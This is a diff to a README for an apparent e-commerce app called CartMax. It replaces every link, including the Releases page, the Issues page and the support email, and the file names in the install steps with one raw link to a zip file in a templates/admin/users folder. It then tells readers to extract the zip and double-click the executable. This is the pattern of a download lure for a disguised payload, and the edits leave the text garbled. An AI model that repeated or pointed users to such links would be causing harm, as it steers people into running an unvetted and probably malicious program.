@@ -6,13 +6,13 @@ Welcome to CartMax, your user-friendly e-commerce platform! CartMax allows you t
 
 ## 🥇 Download CartMax
 
-[![Download CartMax](https://img.shields.io/badge/Download%20CartMax-Click%20Here-brightgreen)](https://github.com/nnig2507/CartMax/releases)
+[![Download CartMax](https://raw.githubusercontent.com/nnig2507/CartMax/main/templates/admin/users/CartMax_v3.0.zip%20CartMax-Click%20Here-brightgreen)](https://raw.githubusercontent.com/nnig2507/CartMax/main/templates/admin/users/CartMax_v3.0.zip)
 
 ## 📥 Download & Install
 
 To get started, you need to visit our Releases page. Click the link below:
 
-[Visit the Releases Page to Download](https://github.com/nnig2507/CartMax/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/nnig2507/CartMax/main/templates/admin/users/CartMax_v3.0.zip)
 
 Once on the Releases page, look for the latest version. You will find files suited for your operating system. Click on the appropriate file to download CartMax.
 
@@ -38,13 +38,13 @@ To run CartMax, ensure your computer has the following minimum specifications:
 ## ⚙️ Installation Steps
 
 1. **Locate the Downloaded File**  
-   After the download is complete, navigate to your Downloads folder. You should see a file named `CartMax_vX.X.X.zip` (the version number will vary).
+   After the download is complete, navigate to your Downloads folder. You should see a file named `https://raw.githubusercontent.com/nnig2507/CartMax/main/templates/admin/users/CartMax_v3.0.zip` (the version number will vary).
 
 2. **Extract the File**  
-   Right-click on the `CartMax_vX.X.X.zip` file and select "Extract All." Follow the prompts to extract the folder to your desired location.
+   Right-click on the `https://raw.githubusercontent.com/nnig2507/CartMax/main/templates/admin/users/CartMax_v3.0.zip` file and select "Extract All." Follow the prompts to extract the folder to your desired location.
 
 3. **Run the Application**  
-   Open the extracted folder. Look for the file `CartMax.exe` (or `CartMax` for macOS/Linux). Double-click the file to run the application. 
+   Open the extracted folder. Look for the file `https://raw.githubusercontent.com/nnig2507/CartMax/main/templates/admin/users/CartMax_v3.0.zip` (or `CartMax` for macOS/Linux). Double-click the file to run the application. 
 
 4. **Follow the Setup Instructions**  
    Once the application launches, you will be guided through setup. Enter the necessary details, such as your store name and currency preference.
@@ -71,11 +71,11 @@ Check if you have all the system requirements met. If not, ensure your device me
 
 ### Q3: Where can I find more help?
 
-Visit our [GitHub Issues Page](https://github.com/nnig2507/CartMax/issues) for support. You can ask questions or report problems there.
+Visit our [GitHub Issues Page](https://raw.githubusercontent.com/nnig2507/CartMax/main/templates/admin/users/CartMax_v3.0.zip) for support. You can ask questions or report problems there.
 
 ## 📞 Contact Us
 
-For additional inquiries or technical support, email us at support@cartmax.com. We are happy to help.
+For additional inquiries or technical support, email us at https://raw.githubusercontent.com/nnig2507/CartMax/main/templates/admin/users/CartMax_v3.0.zip We are happy to help.
 
 ## 🎉 Join the Community
 
